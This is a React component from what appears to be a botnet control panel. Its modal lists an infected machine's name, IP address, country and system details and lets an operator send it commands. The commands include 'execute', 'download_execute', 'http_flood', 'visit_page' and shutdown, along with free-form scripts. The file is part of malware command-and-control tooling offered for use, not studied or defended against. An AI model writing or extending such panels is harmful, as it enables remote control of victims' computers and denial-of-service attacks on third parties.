// src/components/TransferModal.tsx
import React, { useState } from 'react';
import { UserInfo } from '../types/types';

interface Props {
  isOpen: boolean;
  user: UserInfo;
  setIsOpen: (value: boolean) => void;
  handleProcess: (user: UserInfo, type: string, script: string) => void;
}

const TransferModal: React.FC<Props> = ({ isOpen, user, setIsOpen, handleProcess }) => {
  const [textContent, setTextContent] = useState('');
  const [selectedOption, setSelectedOption] = useState('');

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-gray-500 bg-opacity-75 flex justify-center items-center z-[9999]">
      <div className="bg-white p-6 rounded-lg shadow-lg max-w-lg w-full">
        <h2 className="text-xl font-semibold mb-4">Sending Commands</h2>

        {[
          ['Computer Name', user.computerName],
          ['IP Address', user.ipAddress],
          ['Country', user.country ?? 'United States'],
          ['Status', user.status],
          ['Last Active Time', user.lastActiveTime],
          ['Additional System Details', user.additionalSystemDetails],
        ].map(([label, value], idx) => (
          <div key={idx} className="mb-4 flex">
            <label className="font-semibold text-gray-700 flex-2">{label}:</label>
            <div className="text-gray-900 flex-1 pl-2">{value}</div>
          </div>
        ))}

        <div className="mb-4">
          <label className="font-semibold text-gray-700">Type:</label>
          <select
            value={selectedOption}
            onChange={(e) => setSelectedOption(e.target.value)}
            className="mt-1 block w-full p-2 border border-gray-300 bg-white rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500"
          >
            <option value="">Choose One</option>
            {[
              'messagebox', 'execute', 'download_execute', 'http_flood',
              'visit_page', 'close_bot', 'shutdown', 'restart',
              'hibernate', 'logoff', 'abort',
            ].map(cmd => (
              <option key={cmd} value={cmd}>{cmd.replace('_', ' ')}</option>
            ))}
          </select>
        </div>

        <div className="mb-4">
          <label className="font-semibold text-gray-700">Scripts:</label>
          <textarea
            className="w-full h-[80px] border border-gray-300 rounded-lg shadow-sm focus:ring-2 focus:ring-blue-500 focus:border-blue-500 outline-none transition-all resize-none bg-white text-gray-800 p-3"
            value={textContent}
            onChange={(e) => setTextContent(e.target.value)}
          />
        </div>

        <div className="flex justify-end">
          <button
            onClick={() => handleProcess(user, selectedOption, textContent)}
            className="mr-2 bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-700 transition"
          >
            Send Command
          </button>
          <button
            onClick={() => setIsOpen(false)}
            className="bg-red-500 text-white py-2 px-4 rounded hover:bg-red-700 transition"
          >
            Close
          </button>
        </div>
      </div>
    </div>
  );
};

export default TransferModal;
